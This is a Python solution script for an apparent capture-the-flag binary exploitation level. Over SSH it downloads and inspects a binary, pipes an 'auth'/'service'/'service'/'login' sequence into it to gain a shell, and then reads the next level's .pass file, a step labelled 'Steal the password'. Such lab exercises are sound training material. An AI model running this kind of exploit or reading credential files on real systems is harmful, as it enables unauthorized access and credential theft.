import os
import sys
bool('Ressources' in os.getcwd()) if sys.path.append("../") else sys.path.append("../..")
from utils.ssh import exec, connect_by_previous, get_func_structure, download_from
from utils.text import print_output, print_title
from utils.base import save_token

client = connect_by_previous()

files_list = exec(client, 'ls', title='Get files list')
print_output(files_list, 'Files')
print_title('Test this file')

binary_name = files_list[0]
interrupt = '\\x03'

output = exec(client, f'echo "{interrupt}" | ./{binary_name}', title='Simple execute binary')
print_output(output[0], 'Output')
print_title('Just print two null values')
print_title('Debug Time')

download_from(f'{binary_name}')
print_title('Reverse binary by strings')
output = os.popen(f'strings {os.getcwd()}/{binary_name} | egrep "auth$|service$|login$" | sort --unique').readlines()
print_output(output, 'Interested thing')
print_title('Binary expect one of these key word')

get_func_structure(client, 'main')

f = lambda command: f'echo "{command}" | (echo "auth lrorscha\nservice\nservice\nlogin"; cat -) | ./{binary_name}'
print_title('Very hard to explain this solution, it was found accidentally... '
            'Just initialize user by auth command, cast service two time and just input login and done, so stupid...')

output = exec(client, f('whoami'), title='Check user')
print_output(output[1:])
print_output(output[0], 'Current user')

output = exec(client, f('cat /home/user/level9/.pass'), title='Steal the password')

save_token(output[0])
os.unlink(f'{binary_name}')

